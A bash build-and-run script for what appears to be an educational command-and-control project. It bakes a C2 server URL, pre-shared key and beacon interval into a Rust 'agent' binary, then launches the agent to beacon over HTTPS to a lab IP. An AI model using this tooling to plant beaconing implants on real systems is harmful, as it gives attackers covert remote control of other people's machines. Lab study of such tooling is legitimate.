#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"

# ---------------------------------------------------------------------------
# Configuration — override any of these via environment variables.
# C2_SERVER_IP:  The IP (or hostname) of the C2 server (no scheme, no port).
# C2_SERVER_URL: Full URL; constructed from C2_SERVER_IP if not set directly.
# C2_PSK:        Pre-shared key used for HMAC token derivation and bootstrap.
# ---------------------------------------------------------------------------
C2_SERVER_IP="${C2_SERVER_IP:-192.168.64.18}"
export C2_SERVER_URL="${C2_SERVER_URL:-https://${C2_SERVER_IP}:3443}"
export C2_PSK="${C2_PSK:-educational-c2-psk-key}"

# Pass build-time vars so build.rs bakes the correct URL and PSK into the binary.
export C2_BUILD_SERVER_URL="${C2_BUILD_SERVER_URL:-${C2_SERVER_URL}}"
export C2_BUILD_PSK="${C2_BUILD_PSK:-${C2_PSK}}"
export C2_BUILD_BEACON_INTERVAL="${C2_BUILD_BEACON_INTERVAL:-30}"

echo "Building agent (baking server URL: ${C2_BUILD_SERVER_URL})..."
cargo build -p agent --release

echo "Starting agent with HTTPS encrypted beacon to ${C2_SERVER_URL}"
echo "Agent ID: agent_id.txt | Session key: in-memory only"
exec cargo run -p agent --release
